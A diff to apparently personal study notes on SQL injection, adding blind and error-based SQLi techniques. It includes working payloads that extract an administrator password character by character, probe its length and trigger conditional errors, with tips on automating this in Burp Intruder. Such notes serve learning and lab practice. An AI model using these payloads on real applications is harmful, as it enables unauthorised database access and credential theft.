@@ -63,12 +63,39 @@ Append additional queries:
 3. **Practical injection**:  
     `' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='Users'--`
     
+# Blind SQL Injection (Blind SQLi)
+Definition: Attack where app is vulnerable to SQLi but doesn't show query results in HTTP responses.
 
-## Blind SQLi
+## Techniques:
+1. Conditional Responses:
+   - Basic checks: 
+     xyz' AND '1'='1 (true)
+     xyz' AND '1'='2 (false)
+   - Char-by-char extraction:
+     xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username='Administrator'),1,1) > 'm'
+     xyz' AND SUBSTRING((...),1,1) = 's'
 
-- Exploit via conditional responses (e.g., `AND 1=1`, `AND 1=2`)
-    
+2. Password Length:
+   ' AND (SELECT username FROM users WHERE username='administrator' AND LENGTH(password)<10)='administrator'--
 
+3. Bruteforce Password:
+   ' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='a'--
+   (Use Burp Intruder to automate)
+
+## Error-Based SQLi:
+- Conditional Errors:
+  xyz' AND (SELECT CASE WHEN (1=2) THEN 1/0 ELSE 'a' END)='a' (no error)
+  xyz' AND (SELECT CASE WHEN (1=1) THEN 1/0 ELSE 'a' END)='a' (error)
+
+- Data Extraction:
+  xyz' AND (SELECT CASE WHEN (Username='Admin' AND SUBSTRING(Password,1,1)>'m') THEN 1/0 ELSE 'a' END FROM Users)='a'
+  (Error = true condition)
+
+## Summary:
+1. Boolean-Based: Check true/false responses
+2. Time-Based: Induce delays (SLEEP(), WAITFOR)
+3. Error-Based: Force DB errors
+4. OOB: Exfiltrate via DNS/HTTP
 ## Payload Cheatsheet
 
 
